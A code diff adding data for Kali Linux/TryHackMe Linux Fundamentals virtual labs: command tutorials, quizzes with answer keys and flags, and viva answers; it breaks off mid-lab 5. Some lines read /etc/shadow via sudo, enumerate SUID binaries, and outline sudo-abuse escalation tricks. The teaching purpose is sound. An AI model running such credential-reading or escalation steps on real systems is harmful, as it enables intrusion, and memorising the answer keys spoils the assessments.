@@ -16192,4 +16192,462 @@ print("\\nProcess exited with code 0. ✅")`,
     practice_questions: ["Task 1: Train Logistic Regression on the attrition dataset. Plot the confusion matrix as a heatmap using sns.heatmap().", "Task 2: Test K-NN for K values from 1 to 20. Plot accuracy vs K and identify the optimal K.", "Task 3: Calculate Precision, Recall, and F1-Score for both models. Which model better identifies actual attrition cases?", "Task 4: Identify the top 5 features with highest Logistic Regression coefficients. What are the strongest attrition predictors?"]
 };
 
-
+// =====================================================================
+// KALI LINUX LABS (THM: Linux Fundamentals)
+// =====================================================================
+window.VLAB_DATA["kali_exp1"] = {
+        "title": "THM 1: Linux Fundamentals Part 1 — Introduction & First Commands",
+        "aim": "To understand the fundamentals of Kali Linux and the TryHackMe Linux Fundamentals Part 1 course: system information commands, running first terminal commands, and reading files.",
+        "prerequisites": ["Basic understanding of what an operating system is", "Ability to type and use a keyboard", "No prior Linux experience needed", "A modern web browser (Chrome/Firefox recommended)"],
+        "outcomes": ["Understand what Kali Linux is and why it is used in cybersecurity", "Run your first terminal commands: whoami, hostname, uname -a, echo, pwd, ls", "Read files using the cat command", "Understand the difference between root (#) and regular user ($) shell prompts", "Locate and read a hidden TryHackMe-style flag from the filesystem"],
+        "tools": [
+            { "name": "Kali Linux Terminal (bash)", "category": "Shell / CLI", "description": "The default Bourne Again Shell (bash) — your primary interface to the Kali Linux OS. All commands are executed here." },
+            { "name": "whoami", "category": "User Info Command", "description": "Prints the username of the currently logged-in user. Useful as the very first command to verify your identity in a system." },
+            { "name": "uname -a", "category": "System Info Command", "description": "Displays kernel name, hostname, kernel release, machine hardware name, and OS. Reveals architecture (x86_64 = 64-bit)." },
+            { "name": "cat", "category": "File Reading Command", "description": "Concatenates and prints file contents to stdout. cat /home/kali/flag1.txt reads the THM flag hidden in the home directory." },
+            { "name": "echo", "category": "Output Command", "description": "Prints text or variable values to the terminal. echo Hello TryHackMe outputs the string to stdout." }
+        ],
+        "theory": {
+            "intro": "Kali Linux is a Debian-based Linux distribution maintained by Offensive Security, specifically designed for digital forensics and penetration testing. It comes preloaded with hundreds of security tools including Nmap, Metasploit, Burp Suite, and Wireshark. In this lab, following the TryHackMe Linux Fundamentals Part 1 curriculum, we will explore what Linux is, how it is used in security, and practice the very first commands to interact with the Kali shell.",
+            "cards": [
+                {
+                    "title": "What is Linux?",
+                    "content": "Linux is an open-source operating system kernel created by Linus Torvalds in 1991. It powers servers, mobile devices (Android), supercomputers, IoT devices, and cybersecurity tools. Unlike Windows, Linux uses a powerful command-line interface (CLI) called the bash shell. Everything in Linux is treated as a file, and the kernel manages hardware resources."
+                },
+                {
+                    "title": "Why Kali Linux for Cybersecurity?",
+                    "content": "Kali Linux is the industry-standard OS for penetration testers and security researchers. It ships with 600+ tools pre-installed, including:\n• Nmap – Network scanning\n• Metasploit – Exploitation framework\n• Burp Suite – Web vulnerability scanner\n• Wireshark – Packet analyzer\n• John the Ripper – Password cracker\n• Hydra – Network login cracker\n• Aircrack-ng – Wireless security auditing"
+                },
+                {
+                    "title": "The Linux Bash Shell",
+                    "content": "The bash shell (Bourne Again Shell) is the default command interpreter in Kali Linux. Commands follow the format: command [options] [arguments]\n\nExamples:\n• whoami — shows logged-in username\n• hostname — shows system hostname\n• uname -a — shows kernel/system information\n• echo [text] — prints text to the terminal\n• cat [file] — reads and displays file contents\n• pwd — print working directory\n• ls — list files in current directory"
+                },
+                {
+                    "title": "TryHackMe Platform",
+                    "content": "TryHackMe (THM) is an online cybersecurity learning platform with guided, gamified rooms. Each room contains tasks with questions that you answer by interacting with a virtual machine. In this VLAB, we replicate the THM Linux Fundamentals Part 1 experience with a fully functional browser-based Kali Linux virtual machine — no installation required, no time limit."
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal on the right side of the Experiment tab.",
+            "Run 'whoami' to identify the currently logged-in user.",
+            "Run 'hostname' to find the machine's hostname.",
+            "Run 'uname -a' to inspect the full kernel and architecture details.",
+            "Run 'echo Hello TryHackMe' to execute your first output command.",
+            "Run 'cat /home/kali/flag1.txt' to read a hidden flag file.",
+            "Answer each Task question in the left panel and click 'Check Answer'.",
+            "Complete all tasks to unlock the next lab."
+        ],
+        "pretest": [
+            { "q": "What does 'ls' command do in Linux?", "options": ["Lists files in the current directory", "Logs out the user", "Loads a script", "Lists system processes"], "answer": "Lists files in the current directory" },
+            { "q": "Which OS is Kali Linux based on?", "options": ["Red Hat", "Arch", "Debian", "Gentoo"], "answer": "Debian" },
+            { "q": "The bash shell prompt character for regular users is:", "options": ["#", "$", ">", "@"], "answer": "$" },
+            { "q": "What does 'pwd' stand for?", "options": ["Print Working Directory", "Password", "Personal Web Directory", "Process Working Data"], "answer": "Print Working Directory" },
+            { "q": "Which command prints text to the terminal?", "options": ["cat", "echo", "print", "show"], "answer": "echo" }
+        ],
+        "posttest": [
+            { "q": "After running 'whoami' on the Kali VM, what username appeared?", "options": ["root", "kali", "student", "admin"], "answer": "kali" },
+            { "q": "The 'uname -a' command returned 'x86_64' — what does this indicate?", "options": ["32-bit OS", "64-bit CPU architecture", "ARM processor", "GPU type"], "answer": "64-bit CPU architecture" },
+            { "q": "What flag was found in /home/kali/flag1.txt?", "options": ["THM{kali_root}", "THM{linux_basics_101}", "THM{bash_master}", "THM{whoami_flag}"], "answer": "THM{linux_basics_101}" },
+            { "q": "Which command was used to read flag1.txt?", "options": ["less", "more", "cat", "open"], "answer": "cat" },
+            { "q": "The '#' prompt in Linux shell indicates:", "options": ["Regular user logged in", "Root (superuser) is logged in", "Guest session", "Network mode"], "answer": "Root (superuser) is logged in" }
+        ],
+        "viva": [
+            { "q": "1. What is Kali Linux and how does it differ from Ubuntu?", "a": "Kali Linux is a Debian-based penetration testing distribution by Offensive Security with 600+ security tools pre-installed (Metasploit, Nmap, Burp Suite, Wireshark). Ubuntu is a general-purpose desktop OS designed for everyday use. Kali's kernel has custom patches for wireless drivers and hardware compatibility for security work." },
+            { "q": "2. Explain the Linux file system hierarchy.", "a": "Linux uses the Filesystem Hierarchy Standard (FHS): / (root), /home (user directories), /etc (config files), /var (variable data, logs), /tmp (temporary files), /bin (essential binaries), /sbin (system binaries), /usr (user programs), /root (root home). Everything is organized under the root / directory." },
+            { "q": "3. What is the difference between # and $ shell prompts?", "a": "The $ (dollar sign) prompt indicates you are logged in as a regular unprivileged user. The # (hash/pound sign) indicates you are logged in or operating as root (superuser) with full system privileges. Using sudo temporarily elevates privileges." }
+        ],
+        "practice_commands": ["whoami", "hostname", "uname -a", "echo Hello TryHackMe", "cat /home/kali/flag1.txt", "pwd", "ls", "id"],
+        "practice_questions": ["Task 1: What is the username of the logged-in user?", "Task 2: What is the hostname of the Kali VM?", "Task 3: What architecture does uname -a show?", "Task 4: Read flag1.txt — what is the THM flag?"],
+        "assignment": "Using the Kali Linux VM Terminal in the Experiment tab, run all 8 practice commands listed above and document each output. For each command, write: (1) the command you ran, (2) the exact output you received, and (3) one sentence explaining what the output means. Finally, locate and record the THM flag hidden in /home/kali/flag1.txt. Submit your complete observation log below."
+};
+window.VLAB_DATA["kali_exp2"] = {
+        "title": "THM 2: Linux Fundamentals Part 1 — File System Navigation & Inspection",
+        "aim": "To master Linux file system navigation using pwd, ls, cd commands, and learn to read files in remote directories across the virtual file system.",
+        "prerequisites": ["Completion of THM Lab 1 (Introduction & First Commands)", "Familiarity with opening a Linux terminal", "Understanding that everything in Linux is a file"],
+        "outcomes": ["Navigate the Linux file system using cd, ls, and pwd", "Understand the Linux directory hierarchy (/, /home, /etc, /var/log, /tmp)", "List hidden files using ls -la", "Read system log files from /var/log", "Inspect file types and sizes using ls -lh and file commands"],
+        "tools": [
+            { "name": "pwd", "category": "Navigation Command", "description": "Print Working Directory — shows the absolute path of your current location in the filesystem." },
+            { "name": "ls / ls -la", "category": "Directory Listing", "description": "Lists files in the current directory. ls -la shows all files (including hidden dotfiles) with permissions, owner, size, and timestamp." },
+            { "name": "cd", "category": "Navigation Command", "description": "Change Directory — cd /var/log moves to the system log directory. cd .. goes up one level. cd ~ returns home." },
+            { "name": "cat / less", "category": "File Viewer", "description": "cat reads short files entirely. less allows paginated reading of long files like /var/log/auth.log." },
+            { "name": "file", "category": "File Inspector", "description": "Identifies file type without relying on extension. file flag1.txt reports if it's ASCII text, binary, or symlink." }
+        ],
+        "theory": {
+            "intro": "In Linux, the file system is organized as a hierarchical tree starting at the root directory '/'. Understanding how to navigate this tree using pwd (present directory), ls (list), and cd (change directory) is the foundation of all Linux work. In this lab, following TryHackMe Linux Fundamentals Part 1 – Section 2, you will explore the Kali virtual file system, navigate between directories, and inspect log files.",
+            "cards": [
+                {
+                    "title": "Linux Directory Structure",
+                    "content": "/ — Root (top of file system)\n/home/kali — Home directory for user 'kali'\n/root — Home directory for root superuser\n/etc — System configuration files (passwd, shadow, hosts, crontab)\n/var/log — System log files (auth.log, syslog, kern.log)\n/tmp — Temporary files (world-writable)\n/bin — Essential user binaries (ls, cat, cp, mv)\n/sbin — System administration binaries (ifconfig, iptables)\n/usr — User programs and libraries"
+                },
+                {
+                    "title": "Navigation Commands",
+                    "content": "• pwd — Print current working directory path\n• ls — List files and directories (current)\n• ls -la — Long format with hidden files and permissions\n• ls /etc — List /etc directory without changing to it\n• cd /var/log — Change directory to /var/log\n• cd .. — Go up one level to parent directory\n• cd ~ — Return to home directory\n• cd - — Go back to previous directory"
+                },
+                {
+                    "title": "Reading File Contents",
+                    "content": "• cat [file] — Display entire file contents\n• cat -n [file] — Display with line numbers\n• head [file] — Show first 10 lines\n• tail [file] — Show last 10 lines\n• less [file] — Page through file (q to quit)\n• wc -l [file] — Count number of lines in file\n• file [name] — Detect file type\n• stat [file] — Detailed file metadata (size, timestamps)"
+                },
+                {
+                    "title": "File Permissions Primer",
+                    "content": "Every Linux file has three permission sets: Owner, Group, Others.\nExample: -rw-r--r-- (644)\n• r (4) = read, w (2) = write, x (1) = execute\n• First char: - file, d directory, l symlink\n• Columns: [type][owner][group][others]\nExample: -rwxr-xr-x\n  Owner: rwx (7) — read, write, execute\n  Group: r-x (5) — read, execute\n  Others: r-x (5) — read, execute"
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal.",
+            "Run 'pwd' to confirm your starting directory is /home/kali.",
+            "Run 'ls -la' to list all files including hidden ones in home directory.",
+            "Navigate to /var/log using 'cd /var/log'.",
+            "Run 'ls' to list log files — find the auth.log file.",
+            "Read auth.log with 'cat /var/log/auth.log'.",
+            "Navigate back home with 'cd ~'.",
+            "Read the notes.txt file and answer the Task question."
+        ],
+        "pretest": [
+            { "q": "Which command lists all files including hidden ones?", "options": ["ls", "ls -la", "ls -r", "dir"], "answer": "ls -la" },
+            { "q": "Hidden files in Linux start with:", "options": ["_", ".", "#", "~"], "answer": "." },
+            { "q": "Which directory stores system logs?", "options": ["/etc", "/tmp", "/var/log", "/usr"], "answer": "/var/log" },
+            { "q": "The command 'cd ..' does what?", "options": ["Goes to home directory", "Goes to root directory", "Goes up one directory level", "Lists current directory"], "answer": "Goes up one directory level" },
+            { "q": "What does 'pwd' stand for?", "options": ["Print Working Directory", "Password", "Process Working Data", "Print Web Directory"], "answer": "Print Working Directory" }
+        ],
+        "posttest": [
+            { "q": "Which log file records SSH login authentication events?", "options": ["syslog", "kern.log", "auth.log", "boot.log"], "answer": "auth.log" },
+            { "q": "Starting from /home/kali, which command takes you to /var/log?", "options": ["cd var/log", "cd /var/log", "go /var/log", "navigate /var/log"], "answer": "cd /var/log" },
+            { "q": "The 'ls -la' flag '-a' stands for:", "options": ["All files including hidden", "Alpha sort", "Append mode", "Archive"], "answer": "All files including hidden" },
+            { "q": "The second word in /home/kali/notes.txt was:", "options": ["Welcome", "to", "TryHackMe", "Linux"], "answer": "to" },
+            { "q": "What file is found in /var/log on the Kali VM?", "options": ["flag.txt", "passwd", "auth.log", "hosts"], "answer": "auth.log" }
+        ],
+        "viva": [
+            { "q": "1. What is the purpose of /etc/passwd and /etc/shadow?", "a": "/etc/passwd stores user account information: username, UID, GID, home directory, shell. Historically stored encrypted passwords but is world-readable. /etc/shadow stores actual password hashes (SHA-512) and is readable only by root. This separation prevents password hash leakage to regular users." },
+            { "q": "2. What is the difference between absolute and relative paths?", "a": "Absolute path starts from the root /: /home/kali/notes.txt. Relative path is relative to the current directory: if in /home/kali, then notes.txt or ./notes.txt or downloads/access.log. The tilde ~ is a shortcut for the home directory: ~/notes.txt = /home/kali/notes.txt." }
+        ],
+        "practice_commands": ["pwd", "ls -la", "cd /var/log", "cat /var/log/auth.log", "cat /home/kali/notes.txt", "ls /etc", "file /home/kali/flag1.txt", "wc -l /var/log/auth.log"],
+        "practice_questions": ["Task 1: What is your starting directory (pwd)?", "Task 2: Navigate to /var/log. What authentication log file exists there?", "Task 3: Read notes.txt — what is the second word?", "Task 4: List all files in /etc — how many are visible?"],
+        "assignment": "In the Kali Linux VM Terminal, complete a full file system exploration report: (1) Run pwd and record your starting location. (2) Use ls -la to list all files including hidden ones in /home/kali — note any dotfiles. (3) Navigate to /var/log using cd and list its contents. (4) Read /var/log/auth.log using cat — record the first 3 lines. (5) Navigate to /etc and count all visible files using ls | wc -l. Submit your full navigation log with outputs from each command."
+};
+window.VLAB_DATA["kali_exp3"] = {
+        "title": "THM 3: Linux Fundamentals Part 1 — File Searching & Shell Operators",
+        "aim": "To master Linux file searching with find and grep commands, understand shell operators including output redirection (>) and piping (|), and complete file search challenges.",
+        "prerequisites": ["Completion of THM Labs 1 & 2", "Ability to navigate directories with cd and ls", "Basic understanding of file types in Linux"],
+        "outcomes": ["Search for files by name and extension using find", "Search inside files for patterns using grep", "Chain commands together with the pipe | operator", "Redirect output to files using > and >>", "Find SUID binaries and hidden flags across the filesystem"],
+        "tools": [
+            { "name": "find", "category": "File Search Command", "description": "Searches the filesystem recursively. find / -name 'flag.txt' searches from root. Supports -type, -user, -perm, -size filters." },
+            { "name": "grep", "category": "Text Search Command", "description": "Searches inside file content for patterns. grep 'THM' /etc/passwd finds lines containing THM. Use -r for recursive, -i for case-insensitive." },
+            { "name": "| (Pipe Operator)", "category": "Shell Operator", "description": "Chains commands: output of left becomes input of right. cat access.log | grep THM filters the log for flag lines." },
+            { "name": "> and >> Redirection", "category": "Shell Operator", "description": "> overwrites a file with command output. >> appends. echo 'test' > /tmp/test.txt creates a new file with content." },
+            { "name": "wc -l", "category": "Text Utility", "description": "Counts lines in a file or piped output. wc -l /var/log/auth.log tells you how many login events are logged." }
+        ],
+        "theory": {
+            "intro": "Effective file searching and command chaining are critical cybersecurity skills. In TryHackMe Linux Fundamentals Part 1 – Section 3, we learn to find files using wildcards, search inside files with grep, redirect output to new files, and chain commands with the pipe operator. These skills are essential for log analysis, forensic investigation, and CTF challenges.",
+            "cards": [
+                {
+                    "title": "The find Command",
+                    "content": "find is used to search for files and directories:\n• find / -name 'flag.txt' — Search entire filesystem for flag.txt\n• find /home -name '*.txt' — Find all .txt files in /home\n• find / -type d -name logs — Find directories named 'logs'\n• find / -size +1M — Find files larger than 1 MB\n• find / -user root — Find files owned by root\n• find /tmp -newer /etc/passwd — Find files newer than passwd\n• find / -perm /4000 2>/dev/null — Find SUID binaries (privilege escalation)"
+                },
+                {
+                    "title": "The grep Command",
+                    "content": "grep searches for patterns inside file contents:\n• grep 'root' /etc/passwd — Search for 'root' in passwd\n• grep -r 'password' /var — Recursively search /var\n• grep -i 'error' /var/log/auth.log — Case-insensitive search\n• grep -n 'THM' file.txt — Show line numbers of matches\n• grep -v 'comment' file.txt — Invert match (exclude lines)\n• grep -c 'Failed' auth.log — Count matching lines\n• grep -E 'root|kali' /etc/passwd — Regex OR search"
+                },
+                {
+                    "title": "Shell Operators",
+                    "content": "Shell operators chain commands and redirect output:\n• | (Pipe) — Sends output of one command as input to another\n  Example: cat /etc/passwd | grep root\n• > (Redirect/Overwrite) — Saves output to a new file\n  Example: echo 'hello' > output.txt\n• >> (Append) — Appends output to existing file\n  Example: echo 'line 2' >> output.txt\n• & (Background) — Run command in background\n  Example: nmap -sV 192.168.1.0/24 &\n• && (AND) — Run second command only if first succeeds\n  Example: mkdir logs && cd logs"
+                },
+                {
+                    "title": "Wildcards in Linux",
+                    "content": "Wildcards expand patterns to match multiple files:\n• * — Match any number of characters: ls *.txt\n• ? — Match exactly one character: ls file?.txt\n• [abc] — Match any character in brackets: ls file[123].txt\n• [a-z] — Match range: ls file[a-z].txt\n\nExample usage:\n• find /home/kali -name '*.txt' — All text files\n• ls /var/log/*.log — All log files in /var/log\n• cat /home/kali/flag?.txt — Match flag1.txt, flag2.txt, etc."
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal.",
+            "Run 'find /home/kali -name *.txt' to find all text files.",
+            "Note the downloads/passwords.txt file found.",
+            "Run 'cat /home/kali/downloads/passwords.txt' to read it.",
+            "Search for 'root' in /etc/passwd: 'grep root /etc/passwd'.",
+            "Identify the THM flag hidden in the comment line.",
+            "Practice piping: 'cat /home/kali/downloads/access.log | grep THM'.",
+            "Answer all Task questions and complete the lab."
+        ],
+        "pretest": [
+            { "q": "Which command searches inside file contents?", "options": ["find", "locate", "grep", "search"], "answer": "grep" },
+            { "q": "The | (pipe) operator does what?", "options": ["Redirects to a file", "Runs commands in background", "Chains command output to next command's input", "Deletes a file"], "answer": "Chains command output to next command's input" },
+            { "q": "find /home -name '*.txt' searches for:", "options": ["Directories in /home", "All .txt files in /home", "Hidden files in /home", "Files modified today"], "answer": "All .txt files in /home" },
+            { "q": "grep -i makes the search:", "options": ["Recursive", "Case-insensitive", "Invert match", "Count-only"], "answer": "Case-insensitive" },
+            { "q": "The '>' operator does what?", "options": ["Pipes output", "Redirects and overwrites file", "Appends to file", "Background execution"], "answer": "Redirects and overwrites file" }
+        ],
+        "posttest": [
+            { "q": "Which .txt file was found in /home/kali/downloads?", "options": ["notes.txt", "flag.txt", "passwords.txt", "readme.txt"], "answer": "passwords.txt" },
+            { "q": "The grep flag found in /etc/passwd comment line was:", "options": ["THM{passwd_found}", "THM{kali_grep}", "THM{grep_search_wizard}", "THM{etc_passwd_flag}"], "answer": "THM{grep_search_wizard}" },
+            { "q": "To find all SUID binaries on the system, you would use:", "options": ["find / -perm /4000", "grep suid /etc", "ls -suid /usr/bin", "which suid"], "answer": "find / -perm /4000" },
+            { "q": "cat file.txt | grep 'error' — what does this do?", "options": ["Saves errors to a file", "Searches file.txt for lines containing 'error'", "Counts error lines", "Opens file.txt in editor"], "answer": "Searches file.txt for lines containing 'error'" },
+            { "q": "To search recursively with grep use flag:", "options": ["-i", "-n", "-r", "-v"], "answer": "-r" }
+        ],
+        "viva": [
+            { "q": "1. How would you find all files modified in the last 24 hours?", "a": "Use: find / -mtime -1 (modified in last 1 day) or find / -mmin -60 (modified in last 60 minutes). The -mtime flag uses days, -mmin uses minutes. 2>/dev/null suppresses permission errors." },
+            { "q": "2. Explain the difference between > and >> operators.", "a": "> overwrites the file completely with new content. >> appends new content to the end of existing file. Example: echo 'line1' > file.txt creates file with 'line1'. echo 'line2' >> file.txt adds 'line2' on next line. Using > on an existing file destroys previous content." }
+        ],
+        "practice_commands": ["find /home/kali -name '*.txt'", "grep 'root' /etc/passwd", "grep -r 'THM' /home/kali", "cat /home/kali/downloads/access.log | grep THM", "find / -perm /4000 2>/dev/null", "ls /home/kali/downloads", "echo 'test' > /tmp/test.txt", "cat /tmp/test.txt"],
+        "practice_questions": ["Task 1: Find all .txt files in /home/kali. List them.", "Task 2: Use grep on /etc/passwd to find the THM flag in comments.", "Task 3: What username/password combinations are in passwords.txt?", "Task 4: Pipe the access.log through grep to find the attacker's IP."],
+        "assignment": "You are a junior SOC analyst investigating a potentially compromised Kali VM. Complete these forensic tasks in the terminal: (1) Use find to locate all .txt files under /home/kali and list their full paths. (2) Run grep -r 'THM' /home/kali to find all hidden flags recursively. (3) Use cat /home/kali/downloads/access.log | grep THM to find the flag embedded in web logs. (4) Use find / -perm /4000 2>/dev/null to list all SUID binaries — record 5 results. (5) Redirect all your grep results to a file: grep -r 'THM' /home/kali > /tmp/findings.txt, then cat it. Document all findings below."
+};
+window.VLAB_DATA["kali_exp4"] = {
+        "title": "THM 4: Linux Fundamentals Part 2 — File Operations & Permissions",
+        "aim": "To understand Linux file and directory operations (create, copy, move, delete), learn chmod permission management, and practice privilege escalation with sudo.",
+        "prerequisites": ["Completion of THM Labs 1–3", "Understanding of Linux file system structure", "Familiarity with grep and find commands"],
+        "outcomes": ["Create, copy, move, and delete files and directories", "Understand and apply Linux permission modes with chmod (numeric and symbolic)", "Use sudo to escalate privileges and read root-owned files", "Inspect file ownership with ls -la and understand SUID/SGID bits", "Audit sudo permissions using sudo -l"],
+        "tools": [
+            { "name": "chmod", "category": "Permission Tool", "description": "Changes file permissions. chmod 755 = rwxr-xr-x. chmod 600 = rw------- (private key mode). Supports numeric and symbolic modes." },
+            { "name": "sudo", "category": "Privilege Escalation", "description": "Superuser Do — run commands as root. sudo cat /root/root_flag.txt reads a root-only file. sudo -l lists allowed commands." },
+            { "name": "mkdir / touch / cp / mv / rm", "category": "File Management", "description": "mkdir creates directories. touch creates empty files. cp copies. mv moves/renames. rm -rf force-deletes directories recursively." },
+            { "name": "chown / chgrp", "category": "Ownership Tool", "description": "chown changes file owner. chown kali:kali file sets owner and group. Essential for fixing permission issues after copying files." },
+            { "name": "find -perm /4000", "category": "SUID Scanner", "description": "Finds SUID binaries (run as owner, not caller). find / -perm /4000 2>/dev/null lists privilege escalation candidates." }
+        ],
+        "theory": {
+            "intro": "TryHackMe Linux Fundamentals Part 2 covers practical file management and Linux permission architecture. Understanding how to create, manipulate, and control access to files is fundamental to both system administration and cybersecurity. Improper permission configuration is one of the most common local privilege escalation vulnerabilities.",
+            "cards": [
+                {
+                    "title": "File Management Commands",
+                    "content": "• touch [file] — Create empty file or update timestamp\n• mkdir [dir] — Create a new directory\n• mkdir -p /a/b/c — Create nested directories\n• cp [src] [dst] — Copy file or directory\n• cp -r [dir] [dst] — Copy directory recursively\n• mv [src] [dst] — Move or rename file/directory\n• rm [file] — Delete a file\n• rm -rf [dir] — Force delete directory and all contents\n• ln -s [target] [link] — Create symbolic (soft) link"
+                },
+                {
+                    "title": "Linux Permission System (chmod)",
+                    "content": "Permissions: r=4, w=2, x=1. Three sets: owner, group, others.\n\nNumeric mode:\n• chmod 777 file — rwxrwxrwx (everyone full access)\n• chmod 644 file — rw-r--r-- (owner read-write, others read)\n• chmod 600 file — rw------- (owner only, private key)\n• chmod 755 file — rwxr-xr-x (executable, world-readable)\n• chmod 400 file — r-------- (read-only for owner)\n\nSymbolic mode:\n• chmod u+x script.sh — Add execute for owner\n• chmod o-r file.txt — Remove read from others\n• chmod g+w file.txt — Add write for group"
+                },
+                {
+                    "title": "Sudo & Privilege Escalation",
+                    "content": "sudo (superuser do) allows permitted users to run commands as root:\n• sudo [command] — Run command as root\n• sudo su — Switch to root shell\n• sudo -l — List allowed sudo commands\n• sudo cat /etc/shadow — Read root-only files\n• sudo chmod 777 /root — Change root directory permissions\n\nSecurity Note: The /etc/sudoers file controls who can use sudo. Misconfigured sudo entries (NOPASSWD, wildcard paths) are common privilege escalation vulnerabilities in CTF challenges."
+                },
+                {
+                    "title": "File Ownership (chown/chgrp)",
+                    "content": "• chown [user] [file] — Change file owner\n• chown [user]:[group] [file] — Change owner and group\n• chown -R kali:kali /home/kali — Recursive chown\n• chgrp [group] [file] — Change group only\n• id — Show current user, UID, GID, groups\n• groups — Show which groups current user belongs to\n\nSpecial bits:\n• SUID (4000): Runs as file owner, not executing user\n• SGID (2000): Runs as file's group\n• Sticky Bit (1000): Only owner can delete files (e.g. /tmp)"
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal.",
+            "Create a new directory: 'mkdir workspace'.",
+            "Attempt to read /root/root_flag.txt without sudo — observe Permission denied.",
+            "Use sudo: 'sudo cat /root/root_flag.txt' to read the root flag.",
+            "Create a file: 'touch workspace/test.txt'.",
+            "Change permissions: 'chmod 600 workspace/test.txt'.",
+            "Verify with 'ls -la workspace/'.",
+            "Use 'sudo -l' to see which commands you can run as sudo."
+        ],
+        "pretest": [
+            { "q": "chmod 755 sets permissions to:", "options": ["rw-r--r--", "rwxrwxrwx", "rwxr-xr-x", "rw-rw-rw-"], "answer": "rwxr-xr-x" },
+            { "q": "Which command creates a directory?", "options": ["touch", "mkfile", "mkdir", "create"], "answer": "mkdir" },
+            { "q": "sudo stands for:", "options": ["Super User Domain Override", "Super User Do", "Secure User Directory Open", "Switch User Disk Operation"], "answer": "Super User Do" },
+            { "q": "rm -rf does what?", "options": ["Rename file recursively", "Force delete directory and contents", "Remove root filesystem", "Read file recursively"], "answer": "Force delete directory and contents" },
+            { "q": "SUID bit on a file means:", "options": ["File is shared with all users", "File runs as the file owner's privileges", "File is sticky", "File is group owned"], "answer": "File runs as the file owner's privileges" }
+        ],
+        "posttest": [
+            { "q": "Trying to read /root/root_flag.txt as kali user gives:", "options": ["File not found", "Permission denied", "Access granted", "Segmentation fault"], "answer": "Permission denied" },
+            { "q": "What flag did you find in /root/root_flag.txt using sudo?", "options": ["THM{sudo_win}", "THM{ctf_ultimate_root_flag}", "THM{permission_root_escalation}", "THM{root_access_flag}"], "answer": "THM{permission_root_escalation}" },
+            { "q": "chmod 600 sets permissions to:", "options": ["rw-r--r--", "rw-------", "rwx------", "r--r--r--"], "answer": "rw-------" },
+            { "q": "Which command shows which commands kali can run as sudo?", "options": ["sudo list", "sudo -l", "sudoers show", "cat /etc/sudoers"], "answer": "sudo -l" },
+            { "q": "To create nested directories /a/b/c in one command:", "options": ["mkdir /a/b/c", "mkdir -p /a/b/c", "mkdir -r /a/b/c", "mkdirs /a/b/c"], "answer": "mkdir -p /a/b/c" }
+        ],
+        "viva": [
+            { "q": "1. What is the difference between SUID and SGID?", "a": "SUID (Set User ID, 4000): When a file with SUID is executed, it runs with the privileges of the file's owner (not the executing user). Example: /usr/bin/passwd runs as root. SGID (Set Group ID, 2000): File runs as the file's group. On directories, new files inherit the directory's group. Both are common privilege escalation vectors if misconfigured." },
+            { "q": "2. How do attackers exploit weak sudo configurations?", "a": "Common exploits: (1) NOPASSWD entries let users run specific commands without a password. (2) Wildcard injection: sudo /usr/bin/zip * can be exploited with specially named files. (3) sudo vim/nano/less — these editors allow shell escape with :!/bin/bash. (4) sudo LD_PRELOAD exploitation loads malicious shared libraries. Always audit /etc/sudoers." }
+        ],
+        "practice_commands": ["mkdir workspace", "touch workspace/test.txt", "chmod 600 workspace/test.txt", "ls -la workspace/", "sudo cat /root/root_flag.txt", "sudo -l", "chown kali:kali workspace/", "find / -perm /4000 2>/dev/null"],
+        "practice_questions": ["Task 1: Create directory 'workspace' and create a file inside it.", "Task 2: Try reading /root/root_flag.txt — what error occurs?", "Task 3: Use sudo to read the root flag. What is the flag?", "Task 4: Find all SUID binaries. List 3 you found."],
+        "assignment": "Complete this Linux permission management challenge in the Kali VM Terminal: (1) Create a directory: mkdir ~/pentest_workspace. (2) Inside it, create 3 files: secret.key, report.txt, script.sh. (3) Set permissions: chmod 600 secret.key (owner only), chmod 644 report.txt (world-readable), chmod 755 script.sh (executable). (4) Verify with ls -la ~/pentest_workspace/ and record all permission strings. (5) Attempt to read /root/root_flag.txt without sudo — note the exact error. (6) Use sudo cat /root/root_flag.txt and record the flag. (7) Run sudo -l and list which commands are available to the kali user. Submit all outputs below."
+};
+window.VLAB_DATA["kali_exp5"] = {
+        "title": "THM 5: Linux Fundamentals Part 2 & 3 — Processes, Services & Text Editors",
+        "aim": "To understand Linux process management (ps aux, kill, systemctl), text editors (nano, vi), and system service management relevant to cybersecurity operations.",
+        "prerequisites": ["Completion of THM Labs 1–4", "Basic Linux command literacy", "Understanding of file permissions"],
+        "outcomes": ["List and analyze running processes with ps aux and top", "Terminate malicious processes using kill -9", "Start, stop, and check services with systemctl", "Edit configuration files using nano and vi/vim", "Schedule and inspect cron jobs with crontab"],
+        "tools": [
+            { "name": "ps aux", "category": "Process Inspector", "description": "Lists all running processes with PID, CPU%, MEM%, and command name. Essential for identifying malware and unauthorized miners." },
+            { "name": "kill -9 [PID]", "category": "Process Terminator", "description": "Sends SIGKILL (signal 9) to immediately force-terminate a process. kill 1337 terminates the unauthorized miner in this lab." },
+            { "name": "systemctl", "category": "Service Manager", "description": "Manages systemd services. systemctl status ssh checks if SSH is running. start/stop/enable/disable control the service lifecycle." },
+            { "name": "nano / vi", "category": "Text Editors", "description": "nano: beginner-friendly (Ctrl+O save, Ctrl+X exit). vi: modal editor — press i to type, Esc then :wq to save and quit, :q! to discard." },
+            { "name": "crontab -l / -e", "category": "Task Scheduler", "description": "crontab -l lists scheduled jobs for current user. crontab -e edits them. Format: minute hour day month weekday command." }
+        ],
+        "theory": {
+            "intro": "TryHackMe Linux Fundamentals Parts 2 and 3 cover process management, service control, and text editing — essential daily operations for a Linux security analyst. Understanding how to monitor running processes, terminate malicious ones, manage system services, and edit configuration files using nano or vi is critical for both system administration and incident response.",
+            "cards": [
+                {
+                    "title": "Process Management",
+                    "content": "A process is a running instance of a program. Each has a unique PID.\n\n• ps aux — Show all running processes with CPU/MEM usage\n  Columns: USER, PID, %CPU, %MEM, VSZ, RSS, TTY, STAT, START, TIME, COMMAND\n• ps -ef — Alternative full-format process list\n• top — Real-time process monitor (interactive)\n• htop — Enhanced interactive process viewer\n• pgrep [name] — Find PID by process name\n• kill -9 [PID] — Force terminate process (SIGKILL)\n• killall [name] — Kill all processes with that name\n• pkill [pattern] — Kill processes matching pattern"
+                },
+                {
+                    "title": "System Services (systemctl)",
